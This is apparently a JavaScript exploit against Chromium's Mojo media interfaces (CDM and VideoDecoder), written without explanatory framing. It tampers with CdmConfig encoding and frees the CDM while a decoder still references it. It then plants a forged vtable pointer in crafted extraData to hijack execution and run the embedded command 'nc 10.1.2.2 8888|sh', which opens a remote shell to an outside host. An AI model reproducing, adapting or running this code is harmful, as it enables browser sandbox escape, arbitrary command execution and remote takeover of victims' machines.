var global = this;
function print(...args) {
    console.log.apply(null, args)
    this.document.write.apply(document, args);
    this.document.write("<br>");
}
function patch() {
    media.mojom.CdmConfig.encodedSize = 24;
    var tmp = media.mojom.CdmConfig.encode;
    media.mojom.CdmConfig.encode =
        function (encoder, val) {
            // var packed;
            // encoder.writeUint32(CdmConfig.encodedSize);
            // encoder.writeUint32(0);
            console.log("called");
            tmp(encoder, val);
            encoder.writeUint32(16);
            encoder.writeUint32(0);
            encoder.writeUint32(0);
            encoder.writeUint32(0);
            var codec = mojo.internal;
            encoder.encodeArrayPointer(codec.Uint32, [true, true, false]);
        };
    media.mojom.CdmPromiseResult.Exception.isKnownEnumValue = _ => true;
}

patch();
var interfaceFactory = new media.mojom.InterfaceFactoryPtr();
Mojo.bindInterface(media.mojom.InterfaceFactory.name,
    mojo.makeRequest(interfaceFactory).handle);

function createCdmMoudule() {
    //MojoCdmService
    var cdmodule = new media.mojom.ContentDecryptionModulePtr;
    //InterfaceFactoryImpl::CreateCdm
    //CdmFactoryImpl::CreateCdm
    interfaceFactory.createCdm("com.widevine.alpha", mojo.makeRequest(cdmodule));

    var cdmclientPtrInfo = new mojo.AssociatedInterfacePtrInfo();
    var cdmclientRequest = mojo.makeRequest(cdmclientPtrInfo);
    function ContentDecryptionModuleClientImpl() {
        this.binding = new mojo.AssociatedBinding(media.mojom.ContentDecryptionModuleClient, this, cdmclientRequest);
        function log() { console.log("message received") };
        this.onSessionMessage = log;
        this.onSessionClosed = log;
        this.onSessionKeysChange = log;
        this.onSessionExpirationUpdate = log;
    }
    var contentDecryptionModuleClientImpl = new ContentDecryptionModuleClientImpl();
    var cdmclient = new media.mojom.ContentDecryptionModuleClientAssociatedPtr(cdmclientPtrInfo);
    cdmodule.setClient(cdmclientPtrInfo);
    return cdmodule;
}

var cdmodule2 = createCdmMoudule();
function rejected(result) {
    console.log(result);
}

function resolved2(result) {
    console.log(result);
    global.decoderBuffer = [];
    function module(i) {
        // var cdmodule = cdmodule;
        // if(i==34)
        //     cdmodule = cdmodule2;

        var decoder = new media.mojom.VideoDecoderPtr;
        interfaceFactory.createVideoDecoder(mojo.makeRequest(decoder));
        function createVideoDecoderClient() {
            var videoDecoderClientPtrInfo = new mojo.AssociatedInterfacePtrInfo();
            var videoDecoderClientRequest = mojo.makeRequest(videoDecoderClientPtrInfo);
            function VideoDecoderClientImpl() {
                this.binding = new mojo.AssociatedBinding(media.mojom.VideoDecoderClient, this, videoDecoderClientRequest);
                function log() { console.log("message received") };
                this.OnVideoFrameDecoded = log;
                this.OnWaiting = log;
                this.RequestOverlayInfo = log;
            }
            this.videoDecoderClientImpl = new VideoDecoderClientImpl();
            var videoDecoderClient = new media.mojom.VideoDecoderClientAssociatedPtr(videoDecoderClientPtrInfo);
            return videoDecoderClientPtrInfo;
            //return videoDecoderClient;
        }
        function createMediaLog() {
            var mediaLogPtrInfo = new mojo.AssociatedInterfacePtrInfo();
            var mediaLogRequest = mojo.makeRequest(mediaLogPtrInfo);
            function MediaLogImpl() {
                this.binding = new mojo.AssociatedBinding(media.mojom.MediaLog, this, mediaLogRequest);
                function log() { console.log("message received") };
                this.AddEvent = log;
            }
            this.mediaLogImpl = new MediaLogImpl();
            var mediaLog = new media.mojom.MediaLogAssociatedPtr(mediaLogPtrInfo);
            return mediaLogPtrInfo;
            //return mediaLog;
        }

        var videoFrameHandleReleaserPtr = new media.mojom.VideoFrameHandleReleaserPtr;
        global.decoderBuffer[i] = Mojo.createDataPipe({ elementNumBytes: 1, capacityNumBytes: 0x8000 });
        var colorSpace = new gfx.mojom.ColorSpace({
            customPrimaryMatrix: [0, 0, 0, 0, 0, 0, 0, 0, 0],
            customTransferParams: [0, 0, 0, 0, 0, 0, 0]
        });

        decoder.construct(createVideoDecoderClient(),
            createMediaLog(),
            mojo.makeRequest(videoFrameHandleReleaserPtr),
            decoderBuffer[i].consumer,
            new media.mojom.CommandBufferId({ channelToken: new mojoBase.mojom.UnguessableToken({ high: 80, low: 80 }), routeId: 80 }),
            0,//implementation
            colorSpace
        );

        var config = new media.mojom.VideoDecoderConfig({
            codec: 1,//kCodecVP8
            profile: 0,
            format: 1,
            transformation: new media.mojom.VideoTransformation({}),
            codedSize: new gfx.mojom.Size({ width: 500, height: 500 }),
            visibleRect: new gfx.mojom.Rect({ x: 0, y: 0, height: 1, width: 1 }),
            naturalSize: new gfx.mojom.Size({ width: 100, height: 100 }),
            extraData: [1, 2, 3, 4],
            encryptionScheme: new media.mojom.EncryptionScheme({ pattern: new media.mojom.EncryptionPattern, mode: 1 }),
            colorSpaceInfo: new media.mojom.VideoColorSpace,
            hdrMetadata: new media.mojom.HDRMetadata({
                masteringMetadata: new media.mojom.MasteringMetadata({
                    primaryR: new gfx.mojom.PointF,
                    primaryG: new gfx.mojom.PointF,
                    primaryB: new gfx.mojom.PointF,
                    whitePoint: new gfx.mojom.PointF,
                })
            })

        });
        function fixCommand(u8) {
  
            print("before fix " + String.fromCharCode.apply(null, u8));
            for (var i = 0; i < 4; i++) {
                if (u8[i] === ")".charCodeAt(0) || u8[i] === 0) {
                    print("bad character");
                    throw "bad";
                }
                if (u8[i] === "(".charCodeAt(0))
                    u8[6 + 3 - i] = ")".charCodeAt(0);
                else
                    u8[6 + 3 - i] = u8[i];//倒序
            }

            print("after fix " + String.fromCharCode.apply(null, u8));
        }
        function constructBuffer(ua) {
            var systempoint = localStorage.getItem("systempoint");
            systempoint = parseInt(systempoint);
            print(systempoint.toString(16));
            ua[0x80 / 4] = (systempoint - 16) >>> 0;
            print("vtable point to " + ua[0x80 / 4].toString(16));
            var command = 'a_abcd;nc 10.1.2.2 8888|sh\x00';//
            var copy = new Uint8Array(ua.buffer, 0x84);
            if(command.length>28){
                print("command is too long");
                throw "error";
            }
            for (var i = 0; i < command.length; i++)
                copy[i] = command.charCodeAt(i);
            var u8 = new Uint8Array(ua.buffer, 0x80);
            print("command is " + String.fromCharCode.apply(null, u8));
            fixCommand(u8);
        }

        if (i == 34) {
            var extraData = new Uint8Array(160);//(144-160) 0x80
            var u32array = new Uint32Array(extraData.buffer);
            for (var i = 0; i < u32array.length; i++)
                u32array[i] = 0xffffff + i;
            constructBuffer(u32array);
            decoder.initialize(config, true, result.cdmId).then(_ => {
                decoder.initialize(config, true, 99);
                cdmodule2.ptr.reset();
                config.extraData = extraData;
                decoder.initialize(config, true, 0);
                decoder.ptr.reset();

            });
        }
        else {
            decoder.initialize(config, true, result.cdmId - 1);
            mojoDecoderBuffer = new media.mojom.DecoderBuffer({
                timestamp: new mojoBase.mojom.TimeDelta,
                duration: new mojoBase.mojom.TimeDelta,
                frontDiscard: new mojoBase.mojom.TimeDelta,
                backDiscard: new mojoBase.mojom.TimeDelta,
                sideData: [1, 2, 3, 4],
                dataSize: 0x10000
            });
            decoder.decode(mojoDecoderBuffer);
        }

    }//end module
    module(34);
}//end resolved


cdmodule2.initialize("com.widevine.alpha",//org.w3.clearkey  com.widevine.alpha
    new url.mojom.Origin({ scheme: 'https', host: 'bitmovin.com', port: 443 }),
    new media.mojom.CdmConfig({ allow_distinctive_identifier: false, allow_persistent_state: false, use_hw_secure_codecs: false })).
    then(resolved2, rejected);